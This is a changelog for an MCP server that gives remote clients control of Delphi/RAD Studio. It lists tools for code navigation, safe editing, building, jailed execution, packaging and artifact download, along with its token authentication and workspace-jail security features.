### Added
- `delphi_package` (tool 17): zip a build-output directory on the server
  into a single deploy artifact (recursive, `.dcu` intermediates excluded),
  ready to download with one `delphi_fetch`. The standard route to run GUI
  apps on the client machine: `delphi_build` → `delphi_package` →
  `delphi_fetch`.

## [0.3.0] - 2026-08-19

First complete release: total control of Delphi and its projects from a
remote machine. Built and validated in a single day against DelphiLSP 37.0
(RAD Studio 13 "Florence").

### Added
- **16 MCP tools**: `delphi_symbols`, `delphi_definition`, `delphi_hover`,
  `delphi_completion` (official DelphiLSP engine); `delphi_diagnostics`
  (Error Insight on demand, no build); `delphi_references` (hybrid text scan
  + compiler validation, homonyms rejected); `delphi_read` / `delphi_edit`
  (safe editing: one-line anchors, byte-exact encoding preservation, atomic
  writes, backups + 2-step restore, semantic INSERT, TPF0 hard-reject);
  `delphi_create` (scaffold console/VCL/FMX projects and VCL/FMX forms,
  buildable immediately); `delphi_build` (real MSBuild); `delphi_run`
  (jailed execution with output capture); `delphi_fetch` (chunked artifact
  download with SHA-256); `delphi_search`, `delphi_list` (files and
  explorer-style dirs), `delphi_projects` (locator), `delphi_git`
  (whitelisted operations).
- **Three hosts**: stdio (local MCP clients), console `--http [port]`
  (Streamable HTTP), and `DelphiLspMcpTray` (starts minimized to tray).
- **Security**: Bearer token auth (`[Security] AuthToken` /
  `DELPHI_MCP_TOKEN`) and workspace jail (`[Workspace] Roots` /
  `DELPHI_MCP_ROOTS`) enforced on every disk-touching tool, with
  canonicalized paths (no `..\` escapes, no prefix cousins).
- **Config Fabricator**: project settings generated from the `.dproj` when
  no fresh `.delphilsp.json` exists (stale ones detected and ignored);
  RAD Studio located via the Windows registry (11/12/13+, no hardcoded paths).
- **Tests**: five end-to-end batteries speaking real MCP over stdio/HTTP,
  86 checks total, including byte-level encoding verification and building
  freshly scaffolded projects for real.

### Notes
- Requires a licensed RAD Studio / Delphi 11+ installation on the server
  machine (`DelphiLSP.exe` is not redistributed).
- MCP plumbing vendored from gdksoftware/delphi-mcp-server (MIT) with two
  documented local changes (see `vendor/gdk-mcp-server/VENDOR.md`).
